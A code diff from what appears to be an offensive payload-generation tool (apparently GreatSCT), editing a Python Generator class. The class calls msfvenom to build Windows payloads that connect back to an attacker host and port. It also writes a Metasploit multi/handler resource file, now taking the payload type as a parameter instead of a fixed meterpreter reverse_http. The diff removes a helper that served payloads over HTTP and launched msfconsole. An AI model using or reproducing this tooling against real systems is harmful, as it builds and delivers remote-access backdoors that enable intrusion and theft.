@@ -27,12 +27,12 @@ class Generator():
         if (arch == "x86"):
             os.system("msfvenom -a x86 --platform windows -p " + payload + "PayloadUUIDTracking=true PayloadUUIDName=" +
                       uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
-            self.genMetasploitReourceFile(host, port)
+            self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         else:
             os.system("msfvenom -a x64 --platform windows -p " + payload + "PayloadUUIDTracking=true PayloadUUIDName=" +
                       uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
-            self.genMetasploitReourceFile(host, port)
+            self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         with open("/tmp/metasploit", 'rb') as f:
             code = f.read()
@@ -127,12 +127,7 @@ class Generator():
         for step in build_steps:
             os.popen(step)
 
-    def genShellScript(self):
-        script = "cd ./GenerateAll/\n$TERM python -m SimpleHTTPServer 80\n$TERM msfconsole -r greatsct.rc"
-        with open('./GenerateAll/gr8sct.sh', 'w+') as f:
-            f.write(script)
-
-    def genMetasploitReourceFile(self, host, port):
+    def genMetasploitReourceFile(self, host, port, payload):
         # TODO: make dynamic for arch
         msfrc = '''use exploit/multi/handler
 set TimestampOutput true
@@ -141,8 +136,8 @@ set ExitOnSession false
 set EnableStageEncoding true
 set LHOST {0}
 set LPORT {1}
-set payload windows/meterpreter/reverse_http
-run -j'''.format(host, port)
+set payload {2}
+run -j'''.format(host, port, payload)
 
         with open('./GenerateAll/gr8sct.rc', 'w+') as f:
             f.write(msfrc)
